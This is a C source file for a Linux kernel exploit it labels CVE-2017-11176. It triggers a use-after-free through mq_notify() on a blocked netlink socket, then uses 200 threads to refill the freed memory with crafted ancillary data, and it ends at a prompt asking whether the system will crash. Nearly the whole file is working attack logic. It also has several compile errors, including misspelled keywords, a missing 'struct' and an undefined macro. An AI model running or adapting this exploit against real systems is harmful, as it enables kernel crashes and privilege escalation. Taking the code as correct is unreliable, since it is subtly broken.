// gcc -o test test.c -O0 -pthread

#define _GNU_SOURCE

#include <mqueue.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <pthread.h>

#define _open(pathname, flags) syscall(__NR_open, pathname, flags)
#define _close(fd) syscall(__NR_close, fd)
#define _read(fd, buf, count) syscall(__NR_read, fd, buf, count)
#define _dup(oldfd) syscall(__NR_dup, oldfd)
#define _getpid() syscall(__NR_getpid)
#define _gettid() syscall(__NR_gettid)
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)
#define _connect(sockfd, addr, addrlen) syscall(__NR_connect, sockfd, addr, addrlen)
#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)
#define _setsockopt(sockfd, level, optname, optval, optlen) syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)
#define _getsockopt(sockfd, level, optname, optval, optlen) syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)
#define _sched_yield() syscall(__NR_sched_yield)
#define _sched_setaffinity(pid, cpusetsize, mask) syscall(__NR_sched_setaffinity, pid, cpusetsize, mask)

#define KMALLOC_TARGET 2048
#define SOL_NETLINK (270)
#define NOTIFY_COOKIE_LEN 32 
#define NB_REALLOC_THREADS 200
#define PRESS_KEY() do { printf("[ ] press key to continue...\n"); getchar(); } while(0)

static volatile char g_realloc_data[KMALLOC_TARGET];
static volatile size_t g_nb_realloc_thread_ready = 0;
static volatile size_t g_realloc_now = 0;

struct unblock_thread_arg
{
    int sock_fd;
    int unblock_fd;
    bool is_ready;
};

struct realloc_thread_arg
{
    pthread_t tid;
    int recv_fd;
    int send_fd; 
    struct sockaddr_un addr;
};

// ======================= Stage 2 (Reallocation) =======================
static int migrate_to_cpu0(void)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(0, &set);

    if(_sched_setaffinity(_getpid(), sizeof(set), &set) == -1)
    {
        perror("[-] sched_setaffinity");
        return -1;
    }
    return 0;
}

// check "optmem_max" for use "ancillary data buffer"
static bool can_use_realloc_gadget(void)
{
    int fd;
    int ret;
    bool usable = false;
    char buf[32];

    if((fd = _open("/proc/sys/net/core/optmem_max", O_RDONLY)) < 0)
    {
        perror("[-] open");
        // TODO: fallback to sysctl syscall
        return false; // we can't conclude, try it anyway or not ?
    }

    memset(buf, 0, sizeof(buf));
    if((ret = _read(fd, buf, sizeof(buf))) <= 0)
    {
        perror("[-] read");
        goto out;
    }
    printf("[ ] optmem_max = %s\n", buf);

    if(atol(buf) > 512)
        usable = true;

out:
    _close(fd);
    return usable;
}

static int init_realloc_data(void)
{
    struct cmsghdr *first;
    
    memset((void*)g_realloc_data, 0, sizeof(g_realloc_data));

    // necessary to pass checks in __scm_send()
    first = (struct cmsghdr*) g_realloc_data;
    first->cmsg_len = sizeof(g_realloc_data);
    first->cmsg_level = 0; // must be different than SOL_SOCKET=1 to "skip" cmsg
    first->cmsg_type = 1; // <---- Arbitrary Value

    // TODO: do something useful will the remaining bytes (i.e. arbitrary call)

}

static int init_unix_sockets(struct realloc_thread_arg *rta)
{
    struct timeval tv;
    static int sock_counter = 0;

    if(((rta->recv_fd = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0) ||
       ((rta->send_fd = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0))
    {
        perror("[-] socket");
        goto fail;
    }

    // bind an "abstract" socket (first byte is NULL)
    memset(&rta->addr, 0, sizeof(rta->addr));
    rta->addr.sun_family = AF_UNIX;
    sprintf(rta->addr.sun_path + 1, "sock%lx_%d", _gettid(), ++sock_counter);
    if(_bind(rta->recv_fd, (strcut sockaddr*)&rta->addr, sizeof(rta->addr)))
    {
        perror("[-] bind");
        goto fail;
    }

    if(_connect(rta->send_fd, (struct sockaddr*)&rta->addr, sizeof(rta->addr)))
    {
        perror("[-] connect");
        goto fail;
    }

    // set the timeout value to MAX_SCHEDULE_TIMEOUT
    memset(&tv, 0, sizeof(tv));
    if(_setsockopt(rta->recv_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)))
    {
        perror("[-] setsockopt");
        goto fail;
    }

    return 0;

fail:
    printf("[-] failed to initialize UNIX sockets!");
    return -1;
}

static int init_reallocation(struct realloc_thread_arg *rta, size_t nb_reallocs)
{
    int thread = 0;
    int ret = -1;

    if(!can_use_realloc_gadget())
    {
        printf("[-] can't use the 'ancillary data buffer' reallocation gadget!\n");
        goto fail;
    }
    printf("[+] can use the 'ancillary data buffer' reallocation gadget!\n");

    if(init_realloc_data())
    {
        printf("[-] failed to initialize reallocation data!\n");
        goto fail;
    }
    printf("[+] reallocation data initialized!\n");

    printf("[ ] initializing reallocation threads, please wait...\n");
    for(thread = 0; thread < nb_reallocs; ++thread)
    {
        if(init_unix_sockets(&rta[thread]))
        {
            printf("[-] failed to init UNIX sockets!\n");
            goto fail;
        }

        if((ret = pthread_create(&rta[thread].tid, NULL, realloc_thread, &rta[thread])) != 0)
        {
            perror("[-] pthread create");
            goto fail;
        }
    }

    // wait until all threads have been created
    while(g_nb_realloc_thread_ready < nb_reallocs)
        _sched_yield(); // don't run me, run the reallocator threads!

    printf("[+] %lu reallocation threads ready!\n", nb_reallocs);

    return 0;

fail:
    printf("[-] failed to initialize reallocation\n");
    return -1;
}

static void* realloc_thread(void *arg)
{
    struct realloc_thread_arg *rta = (struct realloc_thread_arg*)arg;
    struct msghdr mhdr;
    char buf[200];

    // initialize msghdr
    struct iovec iov = {
        .iov_base = buf,
        .iov_len = sizeof(buf),
    };
    memset(&mhdr, 0, sizeof(mhdr));
    mhdr.msg_iov = &iov;
    mhdr.msg_iovlen = 1;

    // the thread should inherit main thread cpumask, better be sure and redo-it!
    if(migrate_to_cpu0())
        goto fail;
    
    // make it block 
    while(_sendmsg(rta->send_fd, &mhdr, MSG_DONTWAIT) > 0)
        ;
    if(errno != EAGAIN)
    {
        perror("[-] sendmsg");
        goto fail;
    }

    // use the arbitrary data now
    iov.iov_len = 16;
    mhdr.msg_control = (void*)g_realloc_data;
    mhdr.msg_controllen = sizeof(g_realloc_data);

    g_nb_realloc_thread_ready++;

    while(!g_realloc_now) // spinlock until the big GO 
        ;
    
    // the next call should block while "reallocating"
    if(_sendmsg(rta->send_fd, &mhdr, 0) < 0)
    {
        perror("[-] sendmsg");
        goto fail;
    }

    return NULL;

fail:
    printf("[-] REALLOC THREAD FAILURE!!!\n");
    return NULL;
}

// keep this inlined, we can't loose any time (critical path)
static inline __attibute__((always_inline)) void realloc_NOW(void)
{
    g_realloc_now = 1;
    _sched_yield();
    sleep(5);
}

// ======================= Stage 1 (UAF Trigger) =======================
static void* unblock_thread(void *arg)
{
    struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
    int val = 3535; 

    printf("[Unblock] creating success, sleeping 5sec\n");
    uta->is_ready = true;
    sleep(5);

    printf("[Unblock] closing %d fd\n", uta->sock_fd);
    _close(uta->sock_fd);

    printf("[Unblock] unblocking now\n");
    if(_setsockopt(uta->unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("[-][Unblock] setsockopt");

    return NULL;
}

static int decrease_sock_refcounter(int sock_fd, int unblock_fd)
{
    pthread_t tid;
    struct sigevent sigev;
    struct unblock_thread_arg uta;
    char sival_buffer[NOTIFY_COOKIE_LEN];

    memset(&uta, 0, sizeof(uta));
    uta.sock_fd = sock_fd;
    uta.unblock_fd = unblock_fd;
    uta.is_ready = false;

    memset(&sigev, 0, sizeof(sigev));
    sigev.sigev_notify = SIGEV_THREAD;
    sigev.sigev_value.sival_ptr = sival_buffer;
    sigev.sigev_signo = uta.sock_fd;

    printf("[ ] creating unblock thread...\n");
    if((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
    {
        perror("[-] pthread_create");
        goto fail;
    }

    while(uta.is_ready == false)
        ;
    
    printf("[ ] get ready to block, start mq_notify!!\n");
    if((_mq_notify((mqd_t)-1, &sigev) != -1) || (errno != EBADF))
    {
        perror("mq_notify");
        goto fail;
    }
    printf("[+] mq_notify succeed\n");

    return 0;

fail:
    return -1;
}

static int prepare_blocking_socket(void)
{
    int send_fd;
    int recv_fd;
    char buf[1024*10];
    int new_size = 0;

    struct sockaddr_nl addr = {
        .nl_family = AF_NETLINK,
        .nl_pad = 0,
        .nl_pid = 1337,
        .nl_groups = 0
    };

    struct iovec iov = {
        .iov_base = buf,
        .iov_len = sizeof(buf)
    };

    struct msghdr mhdr = {
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0
    };

    printf("[ ] preparing blocking netlink socket...\n");
    if((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0 ||
       (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0)
    {
        perror("socket");
        goto fail;
    }
    printf("[+] socket created (send_fd = %d, recv_fd = %d\n", send_fd, recv_fd);

    while(_bind(recv_fd, (struct sockaddr *)&addr, sizeof(addr)))
    {
        if(errno != EADDRINUSE)
        {
            perror("[-] bind");
            goto fail;
        }
        addr.nl_pid++;
    }
    printf("[+] netlink socket bound (nl_pid = %d)\n", addr.nl_pid);

    if(_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
    {
        perror("[-] setsockopt(reduce)");
    }
    printf("[+] receive buffer reduced\n");

    printf("[ ] flooding receive socket...\n");
    while(_sendmsg(send_fd, &mhdr, MSG_DONTWAIT) > 0)
        ;
    if(errno != EAGAIN)
    {
        perror("[-] sendmsg");
        goto fail;
    }
    printf("[+] flood completed\n");

    _close(send_fd);

    printf("[+] blocking socket ready\n");
    return recv_fd;

fail:
    printf("[-] failed to prepare block socket\n");
    return -1;
}

// ======================= Main =======================
int main(void)
{
    int sock_fd = -1;
    int sock_fd2 = -1;
    int unblock_fd = -1;
    static realloc_thread_arg rta[NB_REALLOC_THREADS];

	printf("\n-={ CVE-2017-11176 Exploit }=-\n\n");

    if(migrate_to_cpu0())
    {
        printf("[-] failed to migrate to CPU#0\n");
        goto fail;
    }
    printf("[+] successfully migrated to CPU#0\n");

    memset(rta, 0, sizeof(rta));
    if(init_reallocation(rta, NB_REALLOC_THREAD))
    {
        printf("[-] failed to initialize reallocation!\n");
        goto fail;
    }
    printf("[+] reallocation ready!\n");

    if((sock_fd = prepare_blocking_socket()) < 0)
	{
        goto fail;
    }
	printf("[+] netlink socket created = %d\n", sock_fd);

    if(((unblock_fd = _dup(sock_fd)) < 0) || ((sock_fd2 = _dup(sock_fd)) < 0))
    {
        perror("dup");
        goto fail;
    }
    printf("[+] netlink socket fd duplicated (unblock_fd = %d, sock_fd2 = %d)\n", unblock_fd, sock_fd2);

    if(decrease_sock_refcounter(sock_fd, unblock_fd) || 
       decrease_sock_refcounter(sock_fd2, unblock_fd))
    {
        goto fail;
    }
    realloc_NOW();

    printf("[ ] ready to crash?\n");
    PRESS_KEY();

    close(unblock_fd);

    printf("[ ] are we still alive?\n");
    PRESS_KEY();

    return 0;

fail:
	printf("\n-={ Exploit Failed }=-\n");
    PRESS_KEY();
    return -1;
}